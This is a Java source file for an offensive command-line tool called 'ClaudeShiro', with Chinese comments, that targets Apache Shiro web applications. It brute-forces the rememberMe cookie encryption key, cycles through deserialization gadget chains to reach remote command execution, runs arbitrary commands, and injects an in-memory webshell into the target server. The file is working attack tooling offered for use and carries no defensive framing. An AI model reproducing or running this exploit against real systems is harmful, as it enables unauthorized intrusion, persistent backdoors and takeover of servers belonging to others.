package com.sma11new;

import com.sma11new.exp.shiro.ShiroAttack;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;

/**
 * ClaudeShiro — 独立 Shiro 利用工具 (基于 Pyke-Shiro 引擎字节码重建)
 * 爆破 key + 利用链 + 回显 + 内存马 一体化, 无头可接入
 *
 * 设计: ShiroAttack 为静态状态, 爆破用自建 HttpURLConnection 绕开;
 *       exec/rce/memshell 直接调 ShiroAttack (单请求无并发竞争)
 *
 * 用法:
 *   scan  <url> [cookie名] [线程数]        # Shiro 检测 + 全量 1209 key 爆破
 *   rce   <url> <key> [cookie名]           # 自动遍历链+回显, 输出首个命令结果
 *   exec  <url> <key> <chain> <echo> <cmd> [cookie名]
 *   memshell <url> <key> <echo> <path> [cookie名]   # 注入内存马
 *   gcm on|off                             # AES-GCM 模式开关 (默认 CBC)
 *   chains / echoes / keys
 */
public class ClaudeShiro {
    // 原版 Pyke 全部 15 条链 (含 _183 SUID 变体)
    static final String[] CHAINS = {
        "CommonsBeanutils1_183", "CommonsBeanutils1",
        "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsAttrCompare",
        "CommonsBeanutilsObjectToStringComparator_183", "CommonsBeanutilsObjectToStringComparator",
        "CommonsBeanutilsString_183", "CommonsBeanutilsString",
        "CommonsBeanutilsPropertySource_183", "CommonsBeanutilsPropertySource",
        "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2",
        "CommonsCollections2", "CommonsBeanutilsString_192s"
    };
    static final String[] ECHOES = {"AllEcho", "SpringEcho", "TomcatEcho"};

    public static void main(String[] args) {
        if (args.length < 1) { usage(); return; }
        try {
            switch (args[0]) {
                case "scan": scan(args, 1); break;
                case "rce": rce(args, 1); break;
                case "exec": exec(args, 1); break;
                case "memshell": memshell(args, 1); break;
                case "gcm": ShiroAttack.AES_GCM_MODE = args[1].equalsIgnoreCase("on"); System.out.println("GCM=" + ShiroAttack.AES_GCM_MODE); break;
                case "chains": for (String c : CHAINS) System.out.println(c); break;
                case "echoes": for (String e : ECHOES) System.out.println(e); break;
                case "keys": for (String k : readKeys()) System.out.println(k); break;
                default: usage();
            }
        } catch (Throwable t) {
            System.err.println("ERR: " + t);
            t.printStackTrace();
        }
    }

    static void scan(String[] a, int i) throws Exception {
        String url = a[i], cn = i + 1 < a.length ? a[i + 1] : "rememberMe";
        int threads = i + 2 < a.length ? Integer.parseInt(a[i + 2]) : 20;
        int baseline = countDeleteMe(url, cn + "=1");
        if (baseline < 1) { System.out.println("SHIRO=NO baseline=" + baseline); return; }
        System.out.println("SHIRO=YES baseline=" + baseline);
        List<String> keys = readKeys();
        ExecutorService pool = Executors.newFixedThreadPool(threads);
        List<Future<String>> futures = new ArrayList<>();
        for (String k : keys) {
            futures.add(pool.submit(() -> {
                try {
                    String payload = ShiroAttack.buildPayload(k); // 线程安全, SPC
                    int c = countDeleteMe(url, cn + "=" + payload);
                    if (c >= 0 && c < baseline) return k;
                } catch (Throwable t) { }
                return null;
            }));
        }
        int done = 0;
        Set<String> hits = new LinkedHashSet<>();
        for (Future<String> f : futures) {
            String r = f.get();
            if (r != null) { hits.add(r); System.out.println("KEY=HIT " + r); }
            if (++done % 300 == 0) System.err.print(".");
        }
        pool.shutdown();
        System.err.println(" [done " + done + " hits=" + hits.size() + "]");
    }

    static void rce(String[] a, int i) {
        String url = a[i], key = a[i + 1];
        String cn = i + 2 < a.length ? a[i + 2] : "rememberMe";
        for (String chain : CHAINS) {
            for (String echo : ECHOES) {
                try {
                    String out = ShiroAttack.execCmd(url, cn, key, chain, echo, "id");
                    String parsed = parseEcho(out);
                    if (parsed != null && !parsed.isEmpty() && parsed.length() < 2000) {
                        System.out.println("RCE=OK chain=" + chain + " echo=" + echo);
                        System.out.println("OUT=" + parsed);
                        return;
                    }
                } catch (Throwable t) { }
            }
        }
        System.out.println("RCE=NO");
    }

    static void exec(String[] a, int i) {
        String url = a[i], key = a[i + 1], chain = a[i + 2], echo = a[i + 3], cmd = a[i + 4];
        String cn = i + 5 < a.length ? a[i + 5] : "rememberMe";
        String out = ShiroAttack.execCmd(url, cn, key, chain, echo, cmd);
        System.out.println(parseEcho(out));
    }

    static void memshell(String[] a, int i) {
        String url = a[i], key = a[i + 1], echo = a[i + 2], path = a[i + 3];
        String cn = i + 4 < a.length ? a[i + 4] : "rememberMe";
        // injectMemShell(url, cookie, key, chain, echo, path, ?) — chain 被忽略, 内部用 InjectMemTool
        String out = ShiroAttack.injectMemShell(url, cn, key, "CommonsBeanutils1_183", echo, path, "x");
        System.out.println(out == null ? "<null>" : out);
    }

    /** 自建请求数 deleteMe (绕开 ShiroAttack 静态 headers 竞争) */
    static int countDeleteMe(String url, String cookieHeader) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Cookie", cookieHeader);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            conn.setRequestProperty("Accept", "*/*");
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(10000);
            conn.setInstanceFollowRedirects(false);
            conn.connect();
            conn.getResponseCode();
            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, List<String>> e : conn.getHeaderFields().entrySet()) {
                if (e.getKey() != null) sb.append(e.getKey()).append(": ");
                sb.append(String.join(", ", e.getValue())).append("\n");
            }
            try { conn.getInputStream().close(); } catch (Exception ignore) { }
            int n = 0, idx = 0;
            String lower = sb.toString().toLowerCase();
            while ((idx = lower.indexOf("deleteme", idx)) >= 0) { n++; idx += 8; }
            return n;
        } catch (Exception e) { return -1; }
    }

    static List<String> readKeys() throws Exception {
        InputStream is = ClaudeShiro.class.getClassLoader().getResourceAsStream("shiro_keys.txt");
        if (is == null) { // 兜底: 读本地文件
            File f = new File("shiro_keys.txt");
            if (!f.exists()) throw new RuntimeException("shiro_keys.txt not found in classpath or cwd");
            is = new FileInputStream(f);
        }
        BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
        List<String> keys = new ArrayList<>();
        int skipped = 0;
        String line;
        while ((line = br.readLine()) != null) {
            String k = line.trim();
            if (k.isEmpty()) continue;
            // 过滤脏 key: Base64 解码后必须 16/24/32 字节, 否则 AesUtil.encrypt 抛 InvalidKeyException
            try {
                int n = Base64.getDecoder().decode(k).length;
                if (n == 16 || n == 24 || n == 32) keys.add(k);
                else skipped++;
            } catch (IllegalArgumentException e) { skipped++; } // 非合法 Base64
        }
        br.close();
        if (skipped > 0) System.err.println("[readKeys] 跳过非法 key " + skipped + " 个, 有效 " + keys.size() + " 个");
        return keys;
    }

    static String parseEcho(String body) {
        if (body == null) return "<null>";
        Matcher m = Pattern.compile("BrY3jhHrh6(.*?)yQqlMgS1cL", Pattern.DOTALL).matcher(body);
        if (m.find()) {
            try {
                return new String(Base64.getDecoder().decode(m.group(1)), "UTF-8").trim();
            } catch (Exception e) { return m.group(1); }
        }
        String b = body.trim();
        return (b.isEmpty() || b.length() > 3000) ? "<no-echo> len=" + body.length() : b;
    }

    static void usage() {
        System.out.println("ClaudeShiro - 独立 Shiro 利用工具 (Pyke 引擎重建)");
        System.out.println("  scan <url> [cookie名] [线程数]");
        System.out.println("  rce <url> <key> [cookie名]");
        System.out.println("  exec <url> <key> <chain> <echo> <cmd> [cookie名]");
        System.out.println("  memshell <url> <key> <echo> <path> [cookie名]");
        System.out.println("  gcm on|off | chains | echoes | keys");
    }
}
